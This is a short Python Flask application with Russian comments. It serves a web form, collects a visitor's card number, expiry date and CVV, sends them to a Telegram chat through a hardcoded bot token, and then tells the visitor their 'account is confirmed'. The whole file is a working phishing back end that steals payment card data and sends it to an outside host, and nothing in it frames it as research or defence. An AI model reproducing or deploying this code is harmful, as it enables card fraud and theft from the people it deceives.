from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# Замените этот токен на ваш токен бота в телеграме
TELEGRAM_BOT_TOKEN = '7157985071:AAGtlbzGg5zkWgjPuBtRE9VI5WdHwyNTriw'
# Замените этот чат ID на ID вашей группы в телеграме
TELEGRAM_CHAT_ID = '-1002041779438'

# Функция для отправки сообщения в телеграм
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, params=params)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    if request.method == 'POST':
        card_number = request.form['card_number']
        expiration_date = request.form['expiration_date']
        cvv = request.form['cvv']
        
        # Отправляем сообщение с данными карты в телеграм
        message = f"Данные карты: \nНомер - {card_number}, \nСрок действия - {expiration_date}, \nCVV - {cvv}"
        send_telegram_message(message)
        
        return 'Аккаунт успешно подтвержден!'

if __name__ == '__main__':
    app.run(debug=True)